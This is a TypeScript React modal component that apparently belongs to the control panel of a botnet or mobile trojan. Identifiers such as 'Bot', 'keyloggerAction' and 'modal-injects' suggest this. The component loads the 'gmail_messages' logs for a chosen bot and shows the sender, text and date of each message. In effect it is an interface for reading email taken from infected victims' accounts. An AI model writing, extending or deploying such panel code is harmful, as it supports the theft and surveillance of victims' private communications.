import React, {useLayoutEffect, useRef} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Space, Table} from "antd";
import {Bot} from "../../../Model/Bot";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";
import {RedoOutlined} from "@ant-design/icons";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface GmailMessagessLog {
    list: string,
    upper_date: string,
    sender_name: string,
}

interface GmailMessagessProps extends ModalsProps {
    bot: Bot,
}

const GmailMessagess: React.FC<GmailMessagessProps> = (props: GmailMessagessProps) => {
    const dispatch = useAppDispatch();
    const logsReducer = useAppSelector((state: AppState) => state.logs);
    const tableRef = useRef<HTMLDivElement>(null);
    const {t} = useTranslation();

    useLayoutEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("gmail_messages", props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page, {
                keyloggerAction: logsReducer.filters.keyloggerAction,
            }));
        }
    }, [dispatch, props.bot.id, props.visible, logsReducer.page, logsReducer.per_page, logsReducer.filters.keyloggerAction]);


    const closeModal = () => {
        props.setVisible(false);
    };

    const columns = [
        {
            title: t("SENDER"),
            dataIndex: "sender_name",
            key: "sender_name",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("SENDER")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.sender_name}
                    </div>
                </div>
            ),
        },
        {
            title: t("TEXT"),
            dataIndex: "list",
            key: "list",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("TEXT")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.list}
                    </div>
                </div>
            ),
        },
        {
            title: t("DATE"),
            dataIndex: "upper_date",
            key: "upper_date",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("DATE")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.upper_date}
                    </div>
                </div>
            ),
        },
    ];

    let dataSource: GmailMessagessLog[];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as GmailMessagessLog[];
    } else {
        dataSource = [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "gmail_messages" && logsReducer.botId === props.bot.id;

    const refresh = () => {
        dispatch(getLogsList("gmail_messages", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
    };

    return (
        <Modal
            title={t("GET_GMAIL_MESSAGE")}
            className="modal-injects"
            open={props.visible}
            onCancel={closeModal}
            width={600}
            destroyOnClose
            footer={[
                <>
                    <Button
                        type="primary"
                        onClick={refresh}
                        icon={<RedoOutlined />}
                    >
                        {t("REFRESH")}
                    </Button>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        {t("CLOSE")}
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 600, overflowY: "auto"}} ref={tableRef}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                    loading={!isLoaded}
                    locale={{
                        emptyText: (
                            <Space>
                                <i className="fa-solid fa-robot"/> {t("TABLE_EMPTY")}
                            </Space>
                        ),
                    }}
                />
            </div>
        </Modal>
    );
};

export default GmailMessagess;
